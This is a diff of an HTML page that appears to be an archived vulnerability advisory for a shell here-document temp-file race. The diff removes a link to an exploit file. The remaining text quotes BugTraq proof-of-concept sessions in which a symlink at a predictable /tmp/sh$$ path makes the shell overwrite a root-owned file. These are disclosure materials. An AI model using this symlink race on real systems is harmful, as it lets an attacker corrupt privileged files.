@@ -456,7 +456,7 @@
 </td>
 </tr>
 </table>
-</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x3000/2006/bashack.c">#exploit_bashack.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+</div><br><br>#<br>#<br><br>#<br>#<div id="vulnerability">
 <span class="title"></span><br/><br/>
 	This example was contributed by Paul Szabo &amp;lt;psz@maths.usyd.edu.au&amp;gt; :<br/><br/> #!/bin/ksh -x<br/> touch /tmp/silly.1<br/> ln -s /tmp/silly.1 /tmp/sh$$.1<br/> ls -l /tmp/silly.* /tmp/sh$$.*<br/> cat &amp;lt;&amp;lt;EOF<br/> Just some short text<br/> EOF<br/> ls -l /tmp/silly.* /tmp/sh$$.*<br/> rm /tmp/silly.* /tmp/sh$$.*<br/><br/>This example was submitted by proton &amp;lt;proton@energymech.net&amp;gt; in an October 29th, 2001 BugTraq posting:<br/><br/> /tmp# echo 'hello world' &amp;gt; rootfile<br/> /tmp# chmod 600 rootfile<br/> /tmp# ln -s rootfile sh$$<br/> /tmp# chown -h 666.666 sh$$<br/> /tmp# ls -l rootfile sh$$<br/> -rw-------   1 root     root           12 Oct 29 03:55 rootfile<br/> lrwxrwxrwx   1 666      666             8 Oct 29 03:56 sh12660 -&amp;gt;<br/> rootfile<br/> /tmp# cat &amp;lt;&amp;lt;BAR<br/> ? FOO<br/> ? BAR<br/> FOO<br/> o world<br/> /tmp# ls -l rootfile sh$$<br/> /bin/ls: sh12660: No such file or directory<br/> -rw-------   1 root     root           12 Oct 29 03:56 rootfile<br/> /tmp# cat rootfile<br/> FOO<br/> o world<br/> /tmp#<br/><br/>Zenith Parsec &amp;lt;zenith_parsec@the-astronaut.com&amp;gt; submitted an exploit for bash on Linux systems.
 	
